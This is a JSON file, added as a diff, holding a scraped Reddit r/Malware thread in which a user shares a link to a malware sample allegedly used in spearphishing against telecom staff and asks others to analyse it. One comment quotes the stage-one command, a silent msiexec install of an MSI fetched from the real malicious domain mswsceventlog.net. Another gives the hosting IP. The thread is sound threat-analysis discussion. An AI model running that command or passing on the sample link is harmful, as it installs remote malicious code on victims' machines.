@@ -1,0 +1,99 @@
+{
+    "op": {
+        "upvote_ratio": 1.0,
+        "selftext": "Recently this sample was used in attack on Telecom industry using spearfishing technique.\n\n\nI don't think it's complete malware just a stage 1 or 2 because the hosting website is not allowing to download next stage payload. I would really appreciate if you can share your input on the sample and specially on file named \"power\" dropped after execution. It is maybe encrypted and needs the next stage payload to decrypt but i can be wrong.\n\n\nHere is the sample:\nhttps://we.tl/t-tS5ilb4xiy",
+        "title": "State Sponsored Sample",
+        "score": 1,
+        "id": "q0g1ty",
+        "commsNum": 7,
+        "timeStamp": "2021/10/03-04:38:03",
+        "author_name": "MTK911",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 7,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/q0g1ty/state_sponsored_sample/"
+    },
+    "posts": {
+        "hf9hhsy": {
+            "comment": "Ofc. I'll try analyzing it later.",
+            "timeStamp": "2021/10/03-12:38:57",
+            "id": "hf9hhsy",
+            "is_submitter": false,
+            "link_id": "t3_q0g1ty",
+            "parent_id": "t1_hf9gxml",
+            "score": 1,
+            "stickied": false,
+            "author_name": "gofuckarabbit"
+        },
+        "hf9gxml": {
+            "comment": "I already have insight on malware but I'm more interested in technical aspects of it so i posted it here for community and in process learn more from the experts in the field.\n\nAs mentioned i don't have access to the report. Even if i did get access to the report i don't think posting someone's internal document would be cool.",
+            "timeStamp": "2021/10/03-12:35:20",
+            "id": "hf9gxml",
+            "is_submitter": true,
+            "link_id": "t3_q0g1ty",
+            "parent_id": "t1_hf9dasb",
+            "score": 1,
+            "stickied": false,
+            "author_name": "MTK911"
+        },
+        "hf9dasb": {
+            "comment": "How do you know it's not ransomware if you only have the first stage? I don't want to sound rude, It's a serious question.\n\nWould sharing the report be possible?",
+            "timeStamp": "2021/10/03-12:11:25",
+            "id": "hf9dasb",
+            "is_submitter": false,
+            "link_id": "t3_q0g1ty",
+            "parent_id": "t1_hf971bl",
+            "score": 6,
+            "stickied": false,
+            "author_name": "gofuckarabbit"
+        },
+        "hf971bl": {
+            "comment": "Not all states have high budget so they outsource the project, but the reason it's a state Sponsored because it was used to target specific people in Telecom industry who are either in higher management or are responsible for critical systems. Furthermore the investigation team which investigated the sample stated in the conclusion. I'm not part of them so i don't have access to the report but i got my hands on the sample through a friend.\n\nAlso it's not a ransomware.",
+            "timeStamp": "2021/10/03-11:28:48",
+            "id": "hf971bl",
+            "is_submitter": true,
+            "link_id": "t3_q0g1ty",
+            "parent_id": "t1_hf93x25",
+            "score": 1,
+            "stickied": false,
+            "author_name": "MTK911"
+        },
+        "hf93x25": {
+            "comment": "Domain was registered on:\n2021-03-12T12:09:28Z\n\nHosting and domain by namecheap, it's easy to report and they act fast these days.\n\nThe IP it's pointing at is 198.54.115.164\n\n[Unbelievably it has zero on VT although it has over 942 domains registered on this IP alone!](\nhttps://www.virustotal.com/gui/ip-address/198.54.115.164/summary)\n\nAnd a whole lot of files calling to it that are identified as malware.\n\nI don't think it's an APT or state sponsored, it would be very sloppy of them.\n\nMy bet is a ransomware group, but what do I know that's like a 5 min research on phone.\n\nEdit: what makes you say it was a state sponsored attack in the first place?",
+            "timeStamp": "2021/10/03-11:07:54",
+            "id": "hf93x25",
+            "is_submitter": false,
+            "link_id": "t3_q0g1ty",
+            "parent_id": "t1_hf918kj",
+            "score": 4,
+            "stickied": false,
+            "author_name": "gofuckarabbit"
+        },
+        "hf918kj": {
+            "comment": "[http://mswsceventlog.net/](http://mswsceventlog.net/)&lt;COMPUTER\\_NAME&gt;.msi it is installed using \n\n\"C:\\\\Windows\\\\System32\\\\msiexec.exe\" /i http://mswsceventlog.net/&lt;COMPUTER\\_NAME&gt;.msi /q \n\n&amp;#x200B;\n\nWhere &lt;COMPUTER\\_NAME&gt; is the victim hostname. It was downloading before but now it is not so they must have removed it. I will share the payload if someone shared it with me.",
+            "timeStamp": "2021/10/03-10:50:04",
+            "id": "hf918kj",
+            "is_submitter": true,
+            "link_id": "t3_q0g1ty",
+            "parent_id": "t1_hf907kc",
+            "score": 3,
+            "stickied": false,
+            "author_name": "MTK911"
+        },
+        "hf907kc": {
+            "comment": "What's the url? Maybe it's geo-locked or user-agent locked? Or it expires based on date or after a single hit to make reversing harder.\n\nOr even all of the above.",
+            "timeStamp": "2021/10/03-10:43:13",
+            "id": "hf907kc",
+            "is_submitter": false,
+            "link_id": "t3_q0g1ty",
+            "parent_id": "t3_q0g1ty",
+            "score": 2,
+            "stickied": false,
+            "author_name": "gofuckarabbit"
+        }
+    }
+}
